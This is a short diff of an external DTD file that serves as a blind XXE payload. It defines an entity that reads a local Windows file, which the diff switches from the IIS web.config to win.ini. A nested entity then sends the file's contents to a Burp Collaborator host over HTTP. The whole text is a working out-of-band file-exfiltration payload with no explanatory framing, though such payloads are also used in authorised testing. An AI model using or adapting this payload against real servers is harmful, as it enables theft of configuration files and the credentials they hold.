@@ -1,3 +1,3 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % stolendata SYSTEM "file:///c:/inetpub/wwwroot/web.config">
+<!ENTITY % stolendata SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % inception "<!ENTITY % sendit SYSTEM 'http:/p7xv38s1k35hsjfm7iqj51jzfqli97.burpcollaborator.net/?%stolendata;'>">
